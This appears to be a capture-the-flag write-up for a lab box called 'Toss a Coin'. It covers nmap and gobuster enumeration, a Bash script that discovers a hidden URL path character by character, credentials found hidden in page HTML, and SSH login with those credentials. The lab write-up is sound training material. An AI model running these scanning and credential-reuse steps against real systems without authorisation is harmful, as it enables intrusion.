# Toss a Coin — Enumeration + SSH

## 1. Network Reconnaissance

Initial service scan:

```bash
sudo nmap -sV -sC 10.10.0.18
```

* `-sV`: detects service versions.
* `-sC`: runs Nmap default NSE scripts.

Result:

```bash
22/tcp open  ssh
80/tcp open  http
```

Full TCP port scan:

```bash
sudo nmap -p- -T4 10.10.0.18
```

* `-p-`: scans all 65535 TCP ports.
* `-T4`: uses faster timing.

Result: only SSH and HTTP were open.

## 2. Web Content Enumeration

Initial Gobuster scan:

```bash
gobuster dir -u http://10.10.0.18/ -w ~/work/Pentest/Wordlist/SecLists/Discovery/Web-Content/common.txt
```

* `dir`: directory enumeration mode.
* `-u`: target URL.
* `-w`: wordlist to use.

Results:

```bash
/img
/index.html
/t
```

The `/img/` directory contained:

```text
jaskier.jpg
jaskier2.jpg
```

The `/t/` directory displayed:

```bash
"Do you know the lyrics? this one is pretty famous!"
```

## 4. Recursive Enumeration of `/t/`

Enumeration of `/t/`:

```bash
gobuster dir -u http://10.10.0.18/t/ -w ~/work/Pentest/Wordlist/SecLists/Discovery/Web-Content/common.txt
```
Result:

```bash
/o
```

Then:

```bash
gobuster dir -u http://10.10.0.18/t/o/ -w ~/work/Pentest/Wordlist/SecLists/Discovery/Web-Content/common.txt
```

Result:

```bash
/s
```

Continuing recursively revealed:

```bash
/t/o/s/s/
```

## 5. Optimizing the Enumeration

Using a full wordlist for every single character was unnecessary, so a smaller character wordlist was created:

```bash
printf '%s\n' {a..z} _ > chars.txt
```

* `{a..z}`: generates letters from `a` to `z`.
* `_`: adds the character used as a space.
* `> chars.txt`: writes the output to a file.

Example:

```bash
gobuster dir -u http://10.10.0.18/t/o/s/s/_/a/ -w chars.txt
```

## 6. Automating the Character-by-Character Discovery

A Bash script was created to automatically follow the valid path:

```bash
#!/bin/bash

url="http://10.10.0.18/t/o/s/s/_/a/_/c/o/i/n/_"

while true; do
    found=""

    for c in {a..z} _; do
        code=$(curl -s -o /dev/null -w "%{http_code}" "$url/$c/")

        if [[ "$code" == "200" || "$code" == "301" ]]; then
            echo "[+] $c  ->  $url/$c/"
            found="$c"
            url="$url/$c"
            break
        fi
    done

    if [[ -z "$found" ]]; then
        echo "[!] No next character found."
        echo "[*] Final path: $url/"
        break
    fi
done
```

Make the script executable:

```bash
chmod +x follow.sh
```

* `+x`: adds execute permission.

Run it:

```bash
./follow.sh
```

Final path:

```bash
/t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_/p/l/e/n/t/y/
```

## 7. Analyzing the Final Web Page

The final page was retrieved with:

```bash
curl -i 'http://10.10.0.18/t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_/p/l/e/n/t/y/'
```

The HTML contained:

```html
<p>"So you DO know the lyrics. Well, good for you!"</p>
<img src="/img/jaskier2.jpg" style="height: 40rem;">
<p style="display: none;">jaskier:YouHaveTheMostIncredibleNeckItsLikeASexyGoose</p>
```
style="display: none;"

This hides the text visually in the browser, but the credentials remain present in the HTML source.

The exposed data followed the format:

```bash
username:password
```

Credentials discovered:

```bash
jaskier
YouHaveTheMostIncredibleNeckItsLikeASexyGoose
```

## 8. SSH Access

The credentials were tested against the SSH service discovered earlier:

```bash
ssh jaskier@10.10.0.18
```

* `ssh`: opens a remote shell.
* `jaskier`: username discovered in the HTML.

Password used:

```bash
YouHaveTheMostIncredibleNeckItsLikeASexyGoose
```

SSH authentication succeeded.

## 9. Retrieving `user.txt`

Once connected:

```bash
ls
```

* Lists files in the current directory.
* Purpose: check whether `user.txt` was directly available.

Result:

```bash
toss-a-coin.py
user.txt
```

The flag was then read with:

```bash
cat user.txt
```

* `cat`: prints the file contents.

## Attack Chain Summary

```text
Nmap
  ↓
HTTP :80 + SSH :22
  ↓
Gobuster
  ↓
/t/
  ↓
recursive character-by-character enumeration
  ↓
"toss a coin to your witcher oh valley of plenty"
  ↓
final HTML source analysis
  ↓
hidden credentials with display:none
  ↓
jaskier:password
  ↓
SSH access
  ↓
/home/jaskier/user.txt
```

## Key Takeaway

The challenge relied mainly on:

* web content enumeration;
* recursive path discovery;
* information disclosure;
* credentials exposed in HTML source;
* reuse of those credentials for SSH access.

Using `display: none` only hides content visually. It does not protect the information because the data is still present in the page source.
